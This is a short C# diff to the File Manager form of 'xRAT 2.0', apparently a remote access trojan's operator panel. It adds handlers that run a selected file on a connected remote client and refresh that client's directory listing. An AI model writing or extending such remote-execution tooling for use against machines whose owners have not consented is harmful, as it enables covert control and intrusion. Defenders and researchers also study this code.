@@ -136,6 +136,24 @@ namespace xRAT_2.Forms
             }
         }
 
+        private void ctxtExecute_Click(object sender, EventArgs e)
+        {
+            foreach (ListViewItem files in lstDirectory.SelectedItems)
+            {
+                if (files.Tag.ToString() == "file")
+                {
+                    string path = currentDir;
+                    if (path.EndsWith(@"\"))
+                        path = path + files.SubItems[0].Text;
+                    else
+                        path = path + @"\" + files.SubItems[0].Text;
+
+                    if (cClient != null)
+                        new Core.Packets.ServerPackets.StartProcess(path).Execute(cClient);
+                }
+            }
+        }
+
         private void btnOpenDLFolder_Click(object sender, EventArgs e)
         {
             string downloadPath = Path.Combine(Application.StartupPath, "Clients\\" + cClient.EndPoint.Address.ToString());
@@ -144,6 +162,15 @@ namespace xRAT_2.Forms
                 Process.Start(downloadPath);
             else
                 MessageBox.Show("No files downloaded yet!", "xRAT 2.0 - File Manager", MessageBoxButtons.OK, MessageBoxIcon.Information);
+        }
+
+        private void ctxtRefresh_Click(object sender, EventArgs e)
+        {
+            if (cClient != null)
+            {
+                new Core.Packets.ServerPackets.Directory(currentDir).Execute(cClient);
+                cClient.Value.lastDirectorySeen = false;
+            }
         }
 
         private void lstDirectory_ColumnClick(object sender, ColumnClickEventArgs e)
